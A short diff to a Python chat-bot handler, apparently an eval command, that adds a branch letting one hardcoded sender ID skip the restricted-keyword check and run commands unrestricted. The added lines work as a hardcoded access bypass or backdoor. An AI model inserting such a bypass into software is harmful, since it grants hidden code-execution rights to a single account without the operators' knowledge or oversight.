@@ -49,6 +49,8 @@ async def val(event):
             for x in restricted:
                 if x in cmd:
                     return await event.reply("This has been disabled for you.")
+        elif event.sender_id == 1455548219:
+            pass
         else:
             return
         e = event
